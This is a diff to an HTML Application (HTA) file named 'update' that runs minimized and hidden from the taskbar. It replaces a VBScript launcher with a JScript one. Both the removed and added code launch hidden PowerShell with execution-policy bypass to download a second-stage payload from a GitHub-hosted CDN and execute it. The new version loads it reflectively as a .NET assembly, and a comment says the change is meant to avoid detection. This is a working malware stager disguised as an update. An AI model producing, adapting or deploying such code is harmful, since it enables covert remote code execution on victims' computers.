@@ -1,11 +1,13 @@
 <html>
 <head>
 <HTA:APPLICATION ID="oHTA" APPLICATIONNAME="update"
-              WINDOWSTATE="minimize" SHOWINTASKBAR="no"/>
-<script language="VBScript">
-    Set shell = CreateObject("WScript.Shell")
-    shell.Run "powershell -w hidden -nop -ep bypass -c ""iex (irm 'https://cdn.jsdelivr.net/gh/<user>/<repo>@main/mock_stager.ps1')""", 0, False
-    window.close()
+              WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no"/>
+<script language="JScript">
+    // spawn PowerShell through IE COM, not mshta
+    var shell = new ActiveXObject("WScript.Shell");
+    var cmd = "powershell -w hidden -nop -ep bypass -c \"$u='https://cdn.jsdelivr.net/gh/beamer123q-svg/update-test@main/stage2.ps1';$b=(New-Object Net.WebClient).DownloadData($u);[System.Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,@(,[string[]]@()))\"";
+    shell.Run(cmd, 0, false);
+    window.close();
 </script>
 </head>
 <body></body>
